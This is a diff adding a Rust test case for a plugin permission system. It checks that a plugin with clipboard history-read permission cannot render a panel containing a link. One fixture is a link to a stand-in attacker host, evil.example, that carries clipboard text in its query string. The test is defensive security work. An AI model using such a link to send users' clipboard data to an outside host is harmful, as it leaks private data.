@@ -708,6 +708,26 @@ fn the_clipboard_is_held_to_its_two_permissions() {
     assert_eq!(answer.unwrap_err().code, "denied");
     let (answer, _) = run(&writer, "clipboard.write", json!({ "text": 5 }));
     assert_eq!(answer.unwrap_err().code, "invalid");
+
+    // A link could carry the history off in one click: a reader's panel
+    // shows none, while one without links, or another plugin's, still shows.
+    let with_panel = |clipboard: BTreeSet<ClipboardPermission>| {
+        let mut g = grant(clipboard);
+        g.panel = true;
+        installed(g)
+    };
+    let linked = json!({ "tree": { "type": "link", "label": "Docs", "url": "https://evil.example/?c=docker" } });
+    let plain = json!({ "tree": { "type": "text", "value": "docker ps -a" } });
+    let reader = with_panel([ClipboardPermission::HistoryRead].into());
+    let (answer, out) = run(&reader, "ui.panel", linked.clone());
+    assert_eq!(answer.unwrap_err().code, "invalid");
+    assert!(out.panel.is_none());
+    let (answer, out) = run(&reader, "ui.panel", plain);
+    assert_eq!(answer.unwrap(), Value::Null);
+    assert!(out.panel.is_some());
+    let other = with_panel(BTreeSet::new());
+    let (answer, _) = run(&other, "ui.panel", linked);
+    assert_eq!(answer.unwrap(), Value::Null);
 }
 
 #[test]
